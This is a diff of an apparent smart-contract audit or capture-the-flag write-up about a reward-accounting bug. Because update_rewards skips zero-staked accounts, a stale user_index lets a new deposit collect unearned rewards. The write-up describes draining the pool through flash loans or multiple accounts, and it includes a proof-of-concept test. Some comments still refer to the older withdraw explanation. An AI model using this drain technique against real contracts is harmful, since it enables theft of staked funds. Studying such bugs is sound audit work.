@@ -280,39 +280,73 @@ invariants.
 
 ### Description
 
-The bug is in `withdraw` and how `update_rewards` works. Because the user can specify the amount to withdraw, they can specify small amounts and get the full staked amount added to pending rewards.
+The bug is in `update_rewards` with the check below. Invariant
+is not updated to set user_index to the new global_index for 
+existing accounts with 0 staked. 
+Attacker can create account and withdraw all tokens, then 
+deposit arbitrary amount to drain rewards pool. 
 
-Just send in many `withdraw` messages with extremely small
-withdrawal amount to accumulate an unfair amount of
-pending rewards.
+A flash loan can be used to deposit arbitrary amount, claim all rewards,
+then withdraw. Or hacker can create multiple accounts depositing 1 token, 
+emptying it, and move around funds to drain rewards pool.
 
 ```rust
-pub fn withdraw(
-    deps: DepsMut,
-    info: MessageInfo,
-    // bao: Note how user passes in `amount` instead of withdrawing all funds
-    amount: Uint128,
-) -> Result<Response, ContractError> {
-    ...
-    update_rewards(&mut user, &state);
-
-    // decrease user amount
-    user.staked_amount -= amount;
-    ...
+if user.staked_amount.is_zero() {
+    return;
 }
+// calculate pending rewards
+let reward = (state.global_index - user.user_index) * user.staked_amount;
+user.pending_rewards += reward;
+
+// bao: invariant does not get set when existing account has 0 staked
+user.user_index = state.global_index;
 ```
 
 ### Recommendation
 
-The fix should be remove withdraw `amount` from message and
-assume `amount` is the total staked. If you want to keep the interface the same,
-
-`TODO`
+Remove the zero check from `update_rewards` to fix this bug.
+```rust
+if user.staked_amount.is_zero() {
+    return;
+}
+```
 
 ### Proof of concept
 
+See `exploit_withdraw_invariant_violation()` in integration tests.
+
 ```rust
-// code goes here
+// Create existing account then empty balance....
+
+// Hacker should be entitled to 0 tokens per spec
+// but can get much more by abusing `withdraw` flaw.
+// Deposits but `user_index` does not get updated on `Deposit {}`
+app.execute_contract(
+    Addr::unchecked(HACKER),
+    contract_addr.clone(),
+    &ExecuteMsg::Deposit {},
+    &[coin(20_000, DENOM)],
+)
+.unwrap();
+let user_info: UserRewardInfo = app
+    .wrap()
+    .query_wasm_smart(
+        contract_addr.clone(),
+        &QueryMsg::User {
+            user: HACKER.to_string(),
+        },
+    )
+    .unwrap();
+assert_eq!(
+    user_info,
+    UserRewardInfo {
+        // Query uses `update_rewards`
+        user_index: Decimal::from_atomics(2u128, 0).unwrap(),
+        // But look, pending rewards is messed up
+        pending_rewards: Uint128::new(20_000),
+        staked_amount: Uint128::new(20_000),
+    }
+);
 ```
 
 ---
